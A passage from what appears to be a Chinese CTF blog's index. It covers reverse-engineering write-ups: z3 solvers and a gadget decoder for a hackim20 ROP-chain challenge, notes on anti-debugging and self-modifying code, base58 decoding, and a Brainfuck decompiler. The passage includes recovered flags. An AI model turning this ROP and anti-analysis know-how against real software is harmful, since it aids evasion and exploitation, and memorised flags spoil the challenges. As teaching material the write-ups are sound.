\"6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2B\" \"d3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9\" \"Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi\" \"6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2B\" \"l3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9\" \"Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq\" \"6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2B\" \"t3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9\" \"Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By\" \"6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2C\" \"b3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9\" \"Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg\" \"6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2C\" \"j3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9\" \"Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co\" \"6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2C\" \"r3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9\" \"Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw\" \"6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2C\" \"z3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9\" \"Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De\" \"6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2D\" \"h3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9\" \"Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm\" \"6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2D\" \"p3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9\" \"Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du\" \"6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9Dw0Dw1Dw2Dw3Dw4Dw5Dw6Dw7Dw8Dw9Dx0Dx1Dx2D\" \"x3Dx4Dx5Dx6Dx7Dx8Dx9Dy0Dy1Dy2Dy3Dy4Dy5Dy6Dy7Dy8Dy9Dz0Dz1Dz2Dz3Dz4Dz5Dz6Dz7Dz8Dz9\" \"Ea0Ea1Ea2Ea3Ea4Ea5Ea6Ea7Ea8Ea9Eb0Eb1Eb2Eb3Eb4Eb5Eb6Eb7Eb8Eb9Ec0Ec1Ec2Ec3Ec4Ec5Ec\" \"6Ec7Ec8Ec9Ed0Ed1Ed2Ed3Ed4Ed5Ed6Ed7Ed8Ed9Ee0Ee1Ee2Ee3Ee4Ee5Ee6Ee7Ee8Ee9Ef0Ef1Ef2E\" \"f3Ef4Ef5Ef6Ef7Ef8Ef9Eg0Eg1Eg2Eg3Eg4Eg5Eg6Eg7Eg8Eg9Eh0Eh1Eh2Eh3Eh4Eh5Eh6Eh7Eh8Eh9\" \"Ei0Ei1Ei2Ei3Ei4Ei5Ei6Ei7Ei8Ei9Ej0Ej1Ej2Ej3Ej4Ej5Ej6Ej7Ej8Ej9Ek0Ek1Ek2Ek3Ek4Ek5Ek\" \"6Ek7Ek8Ek9El0El1El2El3El4El5El6El7El8El9Em0Em1Em2Em3Em4Em5Em6Em7Em8Em9En0En1En2E\" \"n3En4En5En6En7En8En9Eo0Eo1Eo2Eo3Eo4Eo5Eo6Eo7Eo8Eo9Ep0Ep1Ep2Ep3Ep4Ep5Ep6Ep7Ep8Ep9\" \"Eq0Eq1Eq2Eq3Eq4Eq5Eq6Eq7Eq8Eq9Er0Er1Er2Er3Er4Er5Er6Er7Er8Er9Es0Es1Es2Es3Es4Es5Es\" \"6Es7Es8Es9Et0Et1Et2Et3Et4Et5Et6Et7Et8Et9Eu0Eu1Eu2Eu3Eu4Eu5Eu6Eu7Eu8Eu9","date":"2020-04-05","objectID":"/rop%E5%AD%A6%E4%B9%A0/:1:0","tags":null,"title":"ROP学习","uri":"/rop%E5%AD%A6%E4%B9%A0/"},{"categories":["writeup"],"content":"解题 从上面的解析可以看出，最后的返回值就是把flag进行一系列线性变换得到的，所以需要首先得到具体的线性变换，然后使用z3求解器进行求解。 下面的脚本用于求线性变换, 其中flag文件中填入的字符串为: hackim20{00000000000000000000000} import subprocess o = [296, 272, 272, 272, 296, 360, 272, 424, 272, 208, 120, 120, 120, 96, 120, 120, 120, 120, 120, 120, 120, 208, 120, 120, 208, 208, 208, 208, 208, 272, 120, 208, 208] r = [208, 225, 237, 20, 214, 183, 79, 105, 207, 217, 125, 66, 123, 104, 97, 99, 107 , 105, 109, 50, 48, 202, 111, 111, 29, 63, 223, 36, 0, 124, 100, 219, 32] cmd = ['./main'] def getret(): rets = [] with open('blob', 'rb') as f: for offset in o: data = f.read(offset) p = subprocess.Popen(cmd, stdin=subprocess.PIPE) p.stdin.write(data) p.communicate() rets.append(p.returncode) return rets if __name__ == \"__main__\": r = getret() dic = {} for i in range(24): flag = \"hackim20{\" + \"0\" * i + \"1\" + \"0\" * (23 - i) + \"}\" with open('flag', 'w') as f: f.write(flag) ret = getret() for j in range(len(ret)): if ret[j] != r[j]: if not dic.has_key(j): dic[j] = {} dic[j][i] = ret[j] - r[j] print dic 最后打印的dic中是flag中哪些字符串能够影响第i个输出的returncode. 下面的脚本用于使用z3的求解, 其中flag文件中填入的字符串依然是: hackim20{00000000000000000000000} import subprocess from z3 import * o = [296, 272, 272, 272, 296, 360, 272, 424, 272, 208, 120, 120, 120, 96, 120, 120, 120, 120, 120, 120, 120, 208, 120, 120, 208, 208, 208, 208, 208, 272, 120, 208, 208] r = [208, 225, 237, 20, 214, 183, 79, 105, 207, 217, 125, 66, 123, 104, 97, 99, 107 , 105, 109, 50, 48, 202, 111, 111, 29, 63, 223, 36, 0, 124, 100, 219, 32] cmd = ['./main'] def getret(): rets = [] with open('blob', 'rb') as f: for offset in o: data = f.read(offset) p = subprocess.Popen(cmd, stdin=subprocess.PIPE) p.stdin.write(data) p.communicate() rets.append(p.returncode) return rets if __name__ == \"__main__\": ret = getret() dic = {1: {1: 1}, 2: {3: 1, 5: 1, 7: 1}, 3: {9: 1, 21: -1}, 4: {13: 1}, 5: {19: 1, 20: 1}, 6: {0: 1, 8: 1, 2: -1}, 7: {10: -1, 11: 1, 4: 1, 18: -1, 6: 1}, 8: {12: 1, 14: 2}, 9: {16: 1, 17: 1}, 10: {21: 1}, 11: {0: 1}, 21: {2: 1}, 22: {20: 1}, 23: {20: 1}, 24: {20: 1, 4: -1}, 25: {19: 1, 5: -1}, 26: {19: 1, 6: 1}, 27: {18: -1}, 28: {14: 1, 15: -1}, 29: {17: 1}, 30: {10: 1}, 31: {2: 1, 3: 1}, 32: {11: -1, 12: 1}} solver = Solver() val = [Int('x%i' % i) for i in range(23)] for i in range(23): solver.add(val[i] \u003e 20) solver.add(val[i] \u003c 0x7f) for i in range(33): if dic.has_key(i): keys = dic[i].keys() a = r[i] - ret[i] b = 0 for k in keys: b = b + (val[k] - ord('0')) * dic[i][k] solver.add(a == b) # print solver print solver.check() answer=solver.model() print answer tidy_answer=\"\".join([chr(answer[each].as_long()) for each in val]) print \"hackim20{\" + tidy_answer hackim20{B4byR0pDo0dOod00duDoo} ","date":"2020-04-05","objectID":"/rop%E5%AD%A6%E4%B9%A0/:2:0","tags":null,"title":"ROP学习","uri":"/rop%E5%AD%A6%E4%B9%A0/"},{"categories":["writeup"],"content":"官方解法 blob是一个大型的ROP文件，所以本质是一个虚拟机，对输入的字符串进行一系列操作后，根据return输出。 import struct o = [296, 272, 272, 272, 296, 360, 272, 424, 272, 208, 120, 120, 120, 96, 120, 120, 120, 120, 120, 120, 120, 208, 120, 120, 208, 208, 208, 208, 208, 272, 120, 208, 208] r = [208, 225, 237, 20, 214, 183, 79, 105, 207, 217, 125, 66, 123, 104, 97, 99, 107 , 105, 109, 50, 48, 202, 111, 111, 29, 63, 223, 36, 0, 124, 100, 219, 32] bufs = [] gadgets = set() with open('blob', 'rb') as f: for offset in o: data = f.read(offset) bufs.append(data) def decode(buf): na = 56 data_l = [] data = None for i in range(na, len(buf), 8): data = buf[i:i+8] print data data = struct.unpack('\u003cQ', data)[0] #unpack成8字节的小端序数据 print data data_l.append(data) if data \u003e 0x400000: gadgets.add(data) return data_l # for buf in bufs: # addrs = decode(buf) # for g in gadgets: # print(hex(g)[2:]) # for i in `python solution.py`; do echo $i; objdump -d ../dist/main -j.text -M intel | grep $i; echo \"--------------------\"; done dis = {} dis[0x40119a] = 'pop rdi' dis[0x40119c] = 'pop rsi' dis[0x40119e] = 'pop rdx' ''' 23 .bss 00000048 0000000000404080 0000000000404080 00003068 2**5 ALLOC ''' dis[0x4040a0] = 'flag' dis[0x4011a0] = 'pop rcx' dis[0x4011a2] = 'pop rax' dis[0x4011a4] = 'add rax, rdi' dis[0x4011a8] = 'add rax, rsi' dis[0x4011ac] = 'add rax, rdx' dis[0x4011b0] = 'add rax, rcx' dis[0x4011bd] = 'xor rax, rax' dis[0x4011c1] = 'sub rax, rdi' dis[0x4011c5] = 'sub rqx, rsi' dis[0x4011c9] = 'sub rax, rdx' dis[0x4011cd] = 'sub rax, rcx' dis[0x4011d6] = 'movzx rdi, BYTE PTR [rdi]' dis[0x4011db] = 'movzx rsi, BYTE PTR [rsi]' dis[0x4011e0] = 'movzx rdx, BYTE PTR [rdx]' dis[0x4011e5] = 'movzd rcx, BYTE PTR [rcx]' dis[0x4011ea] = 'mov rdi, rax' dis[0x4011ee] = 'mov rsi, rax' dis[0x4011f2] = 'mov rdx, rax' dis[0x4011f6] = 'mov rcx, rax' dis[0x4011ff] = 'call exit@plt' for buf in bufs: addrs = decode(buf) for addr in addrs: try: print(dis[addr]) except KeyError: print(hex(addr)) print('---------------------------') 翻译出来的字节码如下: x86-64的寄存器作用如图所示： rdi寄存器中是exit函数的参数，所以最后的返回值就是rdi中的值。 根据以上操作使用z3解题 from z3 import * s = Solver() n = 31 bv = [] for i in range(n): bv.append(BitVec('bv_{}'.format(i), 32)) alphabet = b'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}' for i in range(n): s.add(bv[i] \u003e= min(alphabet)) s.add(bv[i] \u003c= max(alphabet)) s.add(bv[0] + bv[2] + bv[4] - 100 == 208) s.add(bv[6] + bv[8] + bv[10] == 225) s.add(bv[12] + bv[14] + bv[16] == 237) s.add(bv[18] + bv[1] - bv[30] == 20) s.add(bv[3] + bv[22] + bv[3] - 100 == 214) s.add(bv[5] + bv[29] + bv[28] - bv[7] - 100 == 183) s.add(bv[9] + bv[17] - bv[11] == 79) s.add(bv[13] + bv[15] - bv[19] + bv[20] - bv[27] == 105) s.add(bv[21] + bv[23] + bv[24] == 207) s.add(bv[25] + bv[26] == 217) s.add(bv[30] == 125) s.add(bv[9] == 66) s.add(bv[8] == 123) s.add(bv[0] == 104) s.add(bv[1] == 97) s.add(bv[2] == 99) s.add(bv[3] == 107) s.add(bv[4] == 105) s.add(bv[5] == 109) s.add(bv[6] == 50) s.add(bv[7] == 48) s.add(bv[11] + bv[0] == 202) s.add(bv[29] == 111) s.add(bv[28] == 111) s.add(bv[29] - bv[13] == 29) s.add(bv[28] - bv[14] == 63) s.add(bv[28] + bv[15] == 223) s.add(bv[0] - bv[27] == 36) s.add(bv[23] - bv[24] == 0) s.add(bv[26] + bv[0] - bv[1] == 124) s.add(bv[19] == 100) s.add(bv[11] + bv[12] == 219) s.add(bv[21] - bv[20] == 32) s.check() m = s.model() ans = bytearray() for i in range(n): c = m[bv[i]].as_long() ans.append(c) print(ans.decode('utf-8')) ","date":"2020-04-05","objectID":"/rop%E5%AD%A6%E4%B9%A0/:3:0","tags":null,"title":"ROP学习","uri":"/rop%E5%AD%A6%E4%B9%A0/"},{"categories":["writeup"],"content":"参考链接 ","date":"2020-04-05","objectID":"/rop%E5%AD%A6%E4%B9%A0/:4:0","tags":null,"title":"ROP学习","uri":"/rop%E5%AD%A6%E4%B9%A0/"},{"categories":["writeup"],"content":"蒸米大佬的一步步学ROP系列 一步一步学ROP 之 Linux_x86篇 一步一步学ROP之linux_x64篇 一步一步学ROP之gadgets和2free篇 ","date":"2020-04-05","objectID":"/rop%E5%AD%A6%E4%B9%A0/:4:1","tags":null,"title":"ROP学习","uri":"/rop%E5%AD%A6%E4%B9%A0/"},{"categories":["writeup"],"content":"简洁版本 ROP技术入门教程 ","date":"2020-04-05","objectID":"/rop%E5%AD%A6%E4%B9%A0/:4:2","tags":null,"title":"ROP学习","uri":"/rop%E5%AD%A6%E4%B9%A0/"},{"categories":["writeup"],"content":"加一个z3的链接 z3 solver学习 ","date":"2020-04-05","objectID":"/rop%E5%AD%A6%E4%B9%A0/:4:3","tags":null,"title":"ROP学习","uri":"/rop%E5%AD%A6%E4%B9%A0/"},{"categories":["writeup"],"content":"这次比赛做了四道简单的RE…难的师父做了嘻嘻,我好菜我好菜我好菜,Helica tql！ ","date":"2020-04-05","objectID":"/2020xctf%E6%88%98%E5%BD%B9/:0:0","tags":null,"title":"xctf战役_部分re题目","uri":"/2020xctf%E6%88%98%E5%BD%B9/"},{"categories":["writeup"],"content":"cycle graph 主要记录一份图路径搜索算法的代码hh # 找到一条从start到end的路径 def findPath(graph,start,end,path=[]): path = path + [start] if start == end: return path for node in graph[start]: if node not in path: newpath = findPath(graph,node,end,path) if newpath: return newpath return None # 找到所有从start到end的路径 def findAllPath(graph,start,end,path=[]): path = path +[start] if start == end: return [path] paths = [] #存储所有路径 for node in graph[start]: if node not in path: newpaths = findAllPath(graph,node,end,path) for newpath in newpaths: paths.append(newpath) return paths # 查找最短路径 def findShortestPath(graph,start,end,path=[]): path = path +[start] if start == end: return path shortestPath = [] for node in graph[start]: if node not in path: newpath = findShortestPath(graph,node,end,path) if newpath: if not shortestPath or len(newpath)\u003clen(shortestPath): shortestPath = newpath return shortestPath ''' 主程序 ''' graph = {'A': ['B', 'C','D'], 'B': [ 'E'], 'C': ['D','F'], 'D': ['B','E','G'], 'E': [], 'F': ['D','G'], 'G': ['E']} onepath = findPath(graph,'A','G') print('一条路径:',onepath) allpath = findAllPath(graph,'A','G') print('\\n所有路径：',allpath) shortpath = findShortestPath(graph,'A','G') print('\\n最短路径：',shortpath) ","date":"2020-04-05","objectID":"/2020xctf%E6%88%98%E5%BD%B9/:1:0","tags":null,"title":"xctf战役_部分re题目","uri":"/2020xctf%E6%88%98%E5%BD%B9/"},{"categories":["writeup"],"content":"天津垓 两个考点，第一个是反调试，第二个是smc 反调试中一个是枚举窗口检测ida od等等，还有一个是判断STARTUPINFO信息 题目有两个验证部分，第一个验证是代码中直接可见的，我用z3求解解出来了，第二个是需要经过smc后才可见的，我做题的时候并没有发现smc，用的持续单步然后dump出解密后的代码的方式。 不过这个smc函数并不在基本的流程里面，主要是使用了cygwin这个动态库，然后调用的，我查了一下cygwin这个动态库，主要是用来在windows平台上实现linux平台函数使用的，我后来调试的时候也是发现先进入cygwin.dll然后就到了smc函数的地方，我没太懂这个具体的原理==下面是smc的部分 // sub_100401506(sub_10040164D, 0x415, Str); // 函数调用如上，主要用来修改sub_10040164D这个函数,修改的长度是0x415,Str是第一部分的输入 BOOL __fastcall sub_100401506(void *a1, int a2, __int64 a3) { BOOL result; // eax DWORD flOldProtect; // [rsp+28h] [rbp-8h] int i; // [rsp+2Ch] [rbp-4h] LPVOID lpAddress; // [rsp+40h] [rbp+10h] int v7; // [rsp+48h] [rbp+18h] __int64 v8; // [rsp+50h] [rbp+20h] lpAddress = a1; v7 = a2; v8 = a3; if ( strlen(Str) != 18 ) exit(1); if ( !VirtualProtect(lpAddress, v7, 0x40u, \u0026flOldProtect) ) //将代码段的内存属性修改为可读写和执行 exit(1); for ( i = 0; i \u003c v7; ++i ) *(lpAddress + i) ^= *(i % 18 + v8); result = VirtualProtect(lpAddress, v7, flOldProtect, \u0026flOldProtect); //修改后还原原来的内存属性 if ( !result ) exit(1); return result; } 在 Windows 程序中使用了VirtualProtect()函数来改变虚拟内存区域的属性。函数声明如下: #include \u003cMemoryapi.h\u003e BOOL VirtualProtect( LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect ); VirtualProtect()函数有4个参数，lpAddress是要改变属性的内存起始地址，dwSize是要改变属性的内存区域大小，flAllocationType是内存新的属性类型，lpflOldProtect内存原始属性类型保存地址。而flAllocationType部分值如下表。在 SMC 中常用的是 0x40。 这里smc就是一个简单的与第一部分的输入进行一个异或，使用idc脚本可以得到修改后的代码 第二部分我还是用z3求解，但是因为乘数是素数也可以直接求逆元 ","date":"2020-04-05","objectID":"/2020xctf%E6%88%98%E5%BD%B9/:2:0","tags":null,"title":"xctf战役_部分re题目","uri":"/2020xctf%E6%88%98%E5%BD%B9/"},{"categories":["writeup"],"content":"fxck! 这道题出的还挺那啥的,出题人一手替换文件把我坑惨了…题目最开始的验证部分写的有问题,但是我也有自己的问题,第一个就是不会base58(u1s1就算不知道base58我就连16进制转58进制都没看出来…活该我菜)第二个就是不会brainfuck,我以为是个虚拟机分析了好久,虽然分析出来加密的过程了但是用时太长了…记录一下这两个 ","date":"2020-04-05","objectID":"/2020xctf%E6%88%98%E5%BD%B9/:3:0","tags":null,"title":"xctf战役_部分re题目","uri":"/2020xctf%E6%88%98%E5%BD%B9/"},{"categories":["writeup"],"content":"加密部分 加密部分就是个base58,典型特征就是转58(0x3a)进制,还有查表操作,反编译的代码如下 for ( i = 0; i \u003c v10; ++i ) //进制转换 { v14 = *(char *)(i + v11); for ( j = 0; j \u003c v12; ++j ) { v14 += *((unsigned __int8 *)v20 + j) \u003c\u003c 8; *((_BYTE *)v20 + j) = v14 % 0x3A; v14 /= 0x3Au; } while ( v14 ) { v4 = v12++; *((_BYTE *)v20 + v4) = v14 % 0x3A; v14 /= 0x3Au; } } v5 = std::operator\u003c\u003c\u003cstd::char_traits\u003cchar\u003e\u003e(\u0026std::cout, \"WAIT WAIT WAIT!\"); std::ostream::operator\u003c\u003c(v5, \u0026std::endl\u003cchar,std::char_traits\u003cchar\u003e\u003e); v16 = 0; while ( v16 \u003c v10 \u0026\u0026 !*(_BYTE *)(v16 + v11) ) { v6 = v16++; *(_BYTE *)(v6 + v9) = 49; } for ( k = 0; k \u003c= 57; ++k ) byte_602500[k] ^= byte_602490[k % 7] ^ (unsigned __int8)k; for ( l = 0; l \u003c v12; ++l ) //查表操作 *(_BYTE *)(v16 + l + v9) = byte_602500[*((unsigned __int8 *)v20 + v12 - 1 - l)]; ","date":"2020-04-05","objectID":"/2020xctf%E6%88%98%E5%BD%B9/:3:1","tags":null,"title":"xctf战役_部分re题目","uri":"/2020xctf%E6%88%98%E5%BD%B9/"},{"categories":["writeup"],"content":"验证部分 验证部分是一个brainfuck语言的解释器，这种语言基于一个简单的机器模型，除了指令，这个机器还包括：一个以字节为单位、被初始化为零的数组、一个指向该数组的指针（初始时指向数组的第一个字节）、以及用于输入输出的两个字节流。关于这个语言的介绍: Brainfuck Brainfuck在线解析器 这个语言一共只包含如下8个状态 典型特征是代码中包含指针的加减以及指针指向值的加减 while ( v5 \u003c i ) { v2 = (unsigned __int8)byte_6020A0[v5]; if ( v2 == 0xC4 ) { ++*v9; //+ } else if ( v2 \u003e 196 ) { switch ( v2 ) { case 0xDD: //[ if ( !*v9 ) v5 = dword_603B20[v5]; break; case 0xFD: //] v5 = dword_603B20[v5] - 1; break; case 0xC5: --*v9; //- break; } } else { switch ( v2 ) { case 0xA8: ++v9; //\u003e break; case 0xA9: --v9; //\u003c break; case 1: //. v3 = v7++; s1[v3] = *v9; break; } } ++v5; } 提取byte_6020A0中的指令，使用下面的解释器可以对brainfuck反编译 import re def sym2cal(s): if '\u003e' in s: return len(s) else: return -len(s) def cal(s): if '+' in s: return '+= %d'%len(s) else: return '-= %d'%len(s) def bf2asm(s,ptr,tab): p = 0 l = len(s) while(p\u003cl): pattern = re.compile(r'([\u003e\u003c]*)\\[-([\u003e\u003c]*)\\[-\\]([\u003e\u003c]+)\\[-\\]([\u003e\u003c]+)\\[-([\u003e\u003c]+)\\+([\u003e\u003c]+)\\+([\u003e\u003c]+)\\]([\u003e\u003c]+)\\[-([\u003e\u003c]+)\\+([\u003e\u003c]+)\\]([\u003e\u003c]*)\\[-([\u003e\u003c]+)\\+([\u003e\u003c]+)\\]([\u003e\u003c]*)\\]') match = pattern.match(s[p:]) if match: p += len(match.group()) groups = match.groups() ptr1 = ptr + sym2cal(groups[0]) ptr2 = ptr1 for i in xrange(1,4): ptr2 += sym2cal(groups[i]) ptr3 = ptr2 for i in xrange(4,12): ptr3 += sym2cal(groups[i]) print tab+'mem[%d] += mem[%d]*mem[%d]'%(ptr3,ptr2,ptr1) for v in groups: ptr += sym2cal(v) continue pattern = re.compile(r'([\u003e\u003c]*)\\[-\\]([\u003e\u003c]+)\\[-\\]([\u003e\u003c]+)\\[-([\u003e\u003c]+)\\+([\u003e\u003c]+)\\+([\u003e\u003c]+)\\]([\u003e\u003c]+)\\[-([\u003e\u003c]+)\\+([\u003e\u003c]+)\\]([\u003e\u003c]*)\\[-([\u003e\u003c]+)\\+([\u003e\u003c]+)\\]') match = pattern.match(s[p:]) if match: p += len(match.group()) groups = match.groups() ptr1 = ptr for i in xrange(3): ptr1 += sym2cal(groups[i]) ptr2 = ptr1 for i in xrange(3,11): ptr2 += sym2cal(groups[i]) print tab+'mem[%d] += mem[%d]'%(ptr2,ptr1) for v in groups: ptr += sym2cal(v) continue pattern = re.compile(r'([\u003e\u003c]*)\\[-\\]([\u003e\u003c]+)\\[-\\]([\u003e\u003c]+)\\[-([\u003e\u003c]+)\\+([\u003e\u003c]+)\\+([\u003e\u003c]+)\\]([\u003e\u003c]+)\\[-([\u003e\u003c]+)\\+([\u003e\u003c]+)\\]([\u003e\u003c]+)') match = pattern.match(s[p:]) if match: p += len(match.group()) groups = match.groups() ptr1 = ptr + sym2cal(groups[0]) ptr2 = ptr1 + sym2cal(groups[1]) ptr3 = ptr2 + sym2cal(groups[2]) print tab+'mem[%d] = mem[%d]'%(ptr1,ptr3) for v in groups: ptr += sym2cal(v) continue pattern = re.compile(r'\\[-\\]') match = pattern.match(s[p:]) if match: p += len(match.group()) print tab+'mem[%d] = 0'%(ptr) continue pattern = re.compile(r'\u003e+') match = pattern.match(s[p:]) if match: p += len(match.group()) ptr += len(match.group()) continue pattern = re.compile(r'\u003c+') match = pattern.match(s[p:]) if match: p += len(match.group()) ptr -= len(match.group()) continue pattern = re.compile(r'\\++') match = pattern.match(s[p:]) if match: p += len(match.group()) print tab+'mem[%d] %s'%(ptr,cal(match.group())) continue pattern = re.compile(r'-+') match = pattern.match(s[p:]) if match: p += len(match.group()) print tab+'mem[%d] %s'%(ptr,cal(match.group())) continue c = s[p] if c == '[': stk = 1 for i,v in enumerate(s[p+1:]): if v == '[': stk += 1 elif v == ']': stk -= 1 else: continue if stk == 0: print tab+'while mem[%d]:'%ptr ptr = bf2asm(s[p+1:p+1+i],ptr,tab+'\\t') p += i+1 break continue elif c == ',': if input_ptr \u003c 96: print tab+'mov mem[%d] input[input_ptr]'%ptr else: if bit_add \u003e= 3600: print tab+'mov mem[%d] 0x30'%ptr else: print tab+'mov mem[%d] 1'%ptr elif c == '.': print tab+'cmp mem[%d] data[data_ptr]'%ptr p += 1 return ptr s = \"\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e[-]\u003c\u003c\u003c\u003c\u003c\u003c\u003c\u003c\u003c\u003c\u003c\u003c\u003c\u003c\u003c\u003c\u003c\u003c\u003c\u003c\u003c\u003c\u003c[-]\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e[-\u003e+\u003c\u003c\u003c\u003c\u003c\u003c\u003c\u003c\u003c\u003c\u003c\u003c\u003c\u003c\u003c\u003c\u003c\u003c\u003c\u003c\u003c\u003c\u003c+\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e]\u003c\u003c\u003c\u003c\u003c\u003c\u003c\u003c\u003c\u003c\u003c\u003c\u003c\u003c\u003c\u003c\u003c\u003c\u003c\u003c\u003c\u003c[-\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e+\u003c\u003c\u003c\u003c\u003c\u003c\u003c\u003c\u003c\u003c\u003c\u003c\u003c\u003c\u003c\u003c\u003c\u003c\u003c\u003c\u003c\u003c]\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e,\u003e\u003e\u003e\u003e\u003e\u003e[-]\u003c\u003c\u003c\u003c\u003c\u003c\u003c\u003c\u003c\u003c\u003c\u003c\u003c\u003c\u003c\u003c\u003c\u003c\u003c\u003c\u003c\u003c\u003c\u003c\u003c\u003c\u003c\u003c[-]\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e[-\u003e\u003e\u003e\u003e\u003e\u003e+\u003c\u003c\u003c\u003c\u003c\u003c\u003c\u003c\u003c\u003c\u003c\u003c\u003c\u003c\u003c\u003c\u003c\u003c\u003c\u003c\u003c\u003c\u003c\u003c\u003c\u003c\u003c\u003c+\u003e\u00